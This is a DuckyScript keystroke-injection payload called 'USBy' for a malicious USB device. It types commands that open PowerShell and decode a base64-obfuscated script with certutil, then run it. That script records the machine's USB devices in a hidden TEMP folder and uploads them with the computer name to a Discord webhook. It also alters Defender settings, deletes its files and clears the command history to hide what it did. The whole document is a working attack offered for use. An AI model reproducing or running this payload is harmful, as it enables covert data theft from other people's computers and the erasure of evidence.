REM Title      : USBy
REM Description: Gather all USB Device Names and upload to Discord via webhook.
REM Author     : dag
REM Version    : 0.0.2
REM Generated by REDD's Encrypted Payload Generator
REM - It is highly suggested you adjust the DELAYS for your use.
DELAY 2000
GUI r
DELAY 2000
STRING powershell
DELAY 5000
ENTER
DELAY 5000
STRING $webhook = "DiscordWebhook";
DELAY 500
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo JElzQWRtaW4gPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQ0KJEFkbWluID0gJElzQWRtaW4uSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KaWYgKCRBZG1pbikgew0KICAgIFdyaXRlLUhvc3QgIlJ1bm5pbmcgYXMgQWRtaW5pc3RyYXRvci4iDQp9IGVsc2Ugew0KICAgIFdyaXRlLUhvc3QgIk5vdCBydW5uaW5nIGFzIEFkbWluaXN0cmF0b3IuIg0KfQ0KJGRpciA9ICIkZW52OnRlbXBcSkhrbmZ1aUQiDQppZiAoIShUZXN0LVBhdGggLVBhdGggIiRkaXIiKSkgew0KTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAiJGRpciINCn0NCiRoaWRlID0gR2V0LUl0ZW0gIiRkaXIiIC1Gb3JjZQ0KJGhpZGUuYXR0cmlidXRlcz0nSGlkZGVuJw0KU3RhcnQtU2xlZXAgNQ0KJGxvZyA9ICIkZGlyXG91dHB1dC50eHQiDQpPdXQtRmlsZSAtRmlsZVBhdGggIiRsb2ciDQpBZGQtQ29udGVudCAiJGxvZyIgIn5TdGFydH4iDQokQ3VycmVudERhdGUgPSBHZXQtRGF0ZSAtRGlzcGxheUhpbnQgRGF0ZQ0KQWRkLWNvbnRlbnQgIiRsb2ciICJEYXRlOiAkKCRDdXJyZW50RGF0ZSkiDQokdXNiRGV2aWNlcyA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX1VTQkNvbnRyb2xsZXJEZXZpY2UgfA0KICAgICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFt3bWldKCRfLkRlcGVuZGVudCkgfSB8DQogICAgICAgICAgICAgIFNlbGVjdC1PYmplY3QgTWFudWZhY3R1cmVyLCBEZXNjcmlwdGlvbg0KJHVzYkRldmljZXMgfCBTZWxlY3QtT2JqZWN0IE1hbnVmYWN0dXJlciwgRGVzY3JpcHRpb24gfA0KICAgIE91dC1GaWxlIC1GaWxlUGF0aCAkbG9nIC1BcHBlbmQNCiAgICAkZmlsZVBhdGggPSAkbG9nDQogICAgJGZvbGRlclBhdGggPSAkZGlyDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZm9sZGVyUGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGZvbGRlclBhdGggLUl0ZW1UeXBlIERpcmVjdG9yeQ0KICAgIH0NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlUGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGZpbGVQYXRoIC1JdGVtVHlwZSBGaWxlDQogICAgfQ0KICAgICRoZXhDb2xvciA9ICI1NTI1ODMiDQogICAgJGNvbG9ySW50ID0gW2NvbnZlcnRdOjpUb0ludDMyKCRoZXhDb2xvciwgMTYpDQokZmlsZUNvbnRlbnQgPSBHZXQtQ29udGVudCAkZmlsZVBhdGggLVJhdw0KJG1heERlc2NyaXB0aW9uTGVuZ3RoID0gMjAwMA0KJGNvbnRlbnRDaHVua3MgPSB3aGlsZSAoJGZpbGVDb250ZW50Lkxlbmd0aCAtZ3QgMCkgew0KICAgICRsZW5ndGggPSBbTWF0aF06Ok1pbigkbWF4RGVzY3JpcHRpb25MZW5ndGgsICRmaWxlQ29udGVudC5MZW5ndGgpDQogICAgJGNodW5rID0gJGZpbGVDb250ZW50LlN1YnN0cmluZygwLCAkbGVuZ3RoKQ0KICAgICRmaWxlQ29udGVudCA9ICRmaWxlQ29udGVudC5TdWJzdHJpbmcoJGxlbmd0aCkNCiAgICAkY2h1bmsNCn0NCmZvcmVhY2ggKCRjaHVuayBpbiAkY29udGVudENodW5rcykgew0KICAgICRpbWFnZVVybCA9IGlmICgkY2h1bmsgLW1hdGNoICcoaHR0cHM/Oi8vW15cc10rKScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJycgfQ0KICAgICR0aXRsZSA9IGlmICgkY2h1bmsgLW1hdGNoICd+KC4rPyl+JykgeyAkbWF0Y2hlc1sxXSB9IGVsc2UgeyAnJyB9DQogICAgJHBheWxvYWRPYmplY3QgPSBAew0KICAgICAgICB1c2VybmFtZSA9ICRlbnY6Q29tcHV0ZXJOYW1lDQogICAgICAgIGVtYmVkcyA9IEAoDQogICAgICAgICAgICBAew0KICAgICAgICAgICAgICAgIHRpdGxlICAgICAgID0gJHRpdGxlDQogICAgICAgICAgICAgICAgZGVzY3JpcHRpb24gPSAkY2h1bmsgLXJlcGxhY2UgJyhodHRwcz86Ly9bXlxzXSspJywgJycgLXJlcGxhY2UgJ34oLis/KX4nLCAnJyAjIFJlbW92ZSBpbWFnZSBVUkwgYW5kIHRpdGxlDQogICAgICAgICAgICAgICAgY29sb3IgICAgICAgPSAkY29sb3JJbnQNCiAgICAgICAgICAgICAgICBpbWFnZSAgICAgICA9IEB7IHVybCA9ICRpbWFnZVVybCB9DQogICAgICAgICAgICB9DQogICAgICAgICkNCiAgICB9DQogICAgJHBheWxvYWRKc29uID0gJHBheWxvYWRPYmplY3QgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggNA0KICAgICR0ZW1wRmlsZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBGaWxlTmFtZSgpDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJHRlbXBGaWxlIC1WYWx1ZSAkcGF5bG9hZEpzb24NCiAgICBmdW5jdGlvbiBTZW5kLVdlYmhvb2sgew0KICAgICAgICBwYXJhbSgkY3VybENvbW1hbmQsICRyZXRyeUFmdGVyU2Vjb25kcyA9IDEpDQogICAgICAgICRvdXRwdXQgPSAmICRjdXJsQ29tbWFuZFswXSAkY3VybENvbW1hbmRbMS4uKCRjdXJsQ29tbWFuZC5MZW5ndGggLSAxKV0gMj4mMQ0KICAgICAgICBpZiAoJG91dHB1dCAtbGlrZSAnKjQyOSonKSB7DQogICAgICAgICAgICBpZiAoJG91dHB1dCAtbWF0Y2ggJ1JldHJ5LUFmdGVyOiAoXGQrKScpIHsNCiAgICAgICAgICAgICAgICAkcmV0cnlBZnRlciA9IFtpbnRdJG1hdGNoZXNbMV0NCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJSYXRlIGxpbWl0IGhpdC4gUmV0cnlpbmcgYWZ0ZXIgJHJldHJ5QWZ0ZXIgc2Vjb25kcy4iDQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJHJldHJ5QWZ0ZXINCiAgICAgICAgICAgICAgICBTZW5kLVdlYmhvb2sgLWN1cmxDb21tYW5kICRjdXJsQ29tbWFuZA0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2VpZiAoJExBU1RFWElUQ09ERSAtbmUgMCkgew0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiQ3VybCBleGl0ZWQgd2l0aCBjb2RlICRMQVNURVhJVENPREUiDQogICAgICAgIH0NCiAgICB9DQogICAgJGN1cmxDb21tYW5kID0gQCgNCiAgICAgICAgJ2N1cmwuZXhlJywNCiAgICAgICAgJy1IJywgJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicsDQogICAgICAgICctLWRhdGEtYmluYXJ5JywgIkAkdGVtcEZpbGUiLA0KICAgICAgICAkd2ViaG9vaw0KICAgICkNCiAgICBTZW5kLVdlYmhvb2sgLWN1cmxDb21tYW5kICRjdXJsQ29tbWFuZA0KICAgIFJlbW92ZS1JdGVtIC1QYXRoICR0ZW1wRmlsZQ0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDENCn0NCiAgICBjdXJsLmV4ZSAtRiAicGF5bG9hZF9qc29uPXtcYCJ1c2VybmFtZVxgIjogXGAiJGVudjpDb21wdXRlck5hbWVcYCJ9IiAtRiAiZmlsZT1AXGAiJGxvZ1xgIiIgJHdlYmhvb2sgPiRudWxsIDI+JjENCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1DQogICAgaWYgKCRBZG1pbiAtZXEgJ1RydWUnKXsNCiAgICAgIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJGZhbHNlDQogICAgDQogICAgICBSZW1vdmUtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICIkZGlyIg0KICAgIH0NCiAgICAkdW5oaWRlID0gR2V0LUl0ZW0gIiRkaXIiIC1Gb3JjZQ0KICAgICR1bmhpZGUuYXR0cmlidXRlcz0nTm9ybWFsJw0KICAgIFJlbW92ZS1JdGVtIC1QYXRoICIkZGlyIiAtUmVjdXJzZSAtRm9yY2UNCiAgICBFeGl0 > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
STRING Clear-History
ENTER
STRING exit
ENTER
